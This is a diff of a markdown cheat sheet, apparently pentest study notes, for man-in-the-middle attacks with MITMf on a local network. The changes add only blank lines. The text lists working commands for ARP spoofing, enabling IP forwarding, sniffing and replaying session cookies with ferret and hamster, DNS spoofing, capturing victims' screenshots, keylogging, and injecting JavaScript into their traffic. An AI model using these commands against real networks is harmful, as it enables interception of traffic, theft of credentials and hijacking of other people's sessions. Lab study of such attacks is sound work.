@@ -260,6 +260,7 @@ Example:
 > mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0
 ```
 Enable IP forward to allow packets to flow through our device without being dropped.
+
 `> Echo 1 > /proc/sys/net/ipv4/ip_forward`
 
 WHEN CLIENT USES COOKIES TO LOGIN
@@ -282,24 +283,30 @@ Example:
 ferret -i eth0
 ```
 (is a UI, injects the captured cookies into own browser)
+
 `> hamster`
+
 (to use this tool: go to settings of browser, advanced, network, connection settings
 and change the port numer to 127.0.0.1 Port 1234 and navigate in browser to 127.0.0.1/1234)
 
 ### DNS SPOOFING
 
 start the webserver
+
 `> service apache2 start`
 
 Adjust the file with the right ip settings [[[A]]]
+
 `> leafpad /etc/mitmf/mitmf.conf`
 
 Start spoofing
+
 `> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --dns`
 
 #### MITMF Screenshotter 
 
 `> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 -i eth0 --screen`
+
 (screenshots located in /var/log/mitmf directory)
 
 #### MITMF KEYLOGGER 
@@ -313,6 +320,7 @@ Start spoofing
 OR 
 
 `> mitmf --arp --spoof --gateway 10.20.14.1 --targets 10.20.14.206 --inject --js-file /root/alert.js`
+
 (you need to make a .js file in the home directory)
 
 
